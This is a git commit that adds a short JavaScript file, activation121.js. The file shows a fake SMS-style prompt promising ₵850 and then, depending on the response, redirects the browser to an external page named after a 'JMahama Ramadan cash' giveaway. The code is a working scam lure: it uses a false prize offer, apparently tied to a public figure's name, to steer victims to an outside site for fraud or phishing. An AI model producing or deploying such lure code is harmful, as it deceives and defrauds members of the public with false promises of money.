0d36fcda19d30ce86cb6c6fa00b3780058fee1e8
ita-giftt <tallaakoti@gmail.com>
2026-02-27 16:55:23 +0100

    Create activation121.js

---
+++ activation121.js
@@ -0,0 +1,8 @@
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ₵850. Please press OK to WITHDRAW.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://rward.info/850-JMahama-Ramadan-cash.html';
+}
